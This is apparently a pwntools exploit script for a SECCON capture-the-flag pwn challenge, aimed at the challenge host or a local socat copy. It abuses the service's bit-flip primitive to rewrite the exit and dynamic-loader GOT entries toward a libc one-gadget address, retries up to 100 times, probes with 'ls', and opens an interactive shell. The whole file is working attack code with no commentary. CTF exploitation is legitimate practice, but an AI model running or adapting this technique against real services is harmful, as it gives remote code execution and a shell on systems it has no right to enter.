# coding: utf-8
from __future__ import print_function, division
from pwn import *
import random

#t socat TCP-L:3001,reuseaddr,fork EXEC:./execfile


is_gaibu = False
if is_gaibu:
    host = "profile.pwn.seccon.jp"
    port = 28553
    rce = 0x4526a
    libc_offset = 0x20740 +  240
else:
    host = "127.0.0.1"
    port = 3001
    rce = 0x4526a

    # 0x7f63a7c09830 <__libc_start_main+240>:   0x31000197f9e8c789
    libc_offset = 0x20740 +  240



for i in range(100):
    print(i)
    r = remote(host, port)

    def flip(addr, bit):
        r.recvuntil('flip: ')
        r.sendline(hex(addr))
        r.recvuntil('flip?')
        r.sendline(str(bit))

    exit_got = 0x601031
    dl_got = 0x601010
    flip(exit_got, 0)
    flip(exit_got - 1, 0)


    #bits =  0b110001111100101001100110 #0x7fe37599e870 ^ 0x7fe375602216
    print('ok?')
    #raw_input()
    bits = int(raw_input())
    cnt = 0
    bit = 0

    while bits > 0:
        addr = dl_got + cnt
        print(hex(addr), bit)
        if bits & 1 == 1:
            flip(addr, bit)
        bits >>= 1
        bit += 1
        if bit == 8:
            bit = 0
            cnt += 1


    flip(0, 8)
    flip(0, 8)
    flip(0, 8)
    flip(0, 8)
    flip(0, 8)
    flip(0, 8)
    flip(0, 8)

    flip(exit_got - 1, 0)
    flip(exit_got, 0)

    try:
        r.sendline('ls')
        r.recv()
    except:
        r.close()
        continue
    r.interactive()
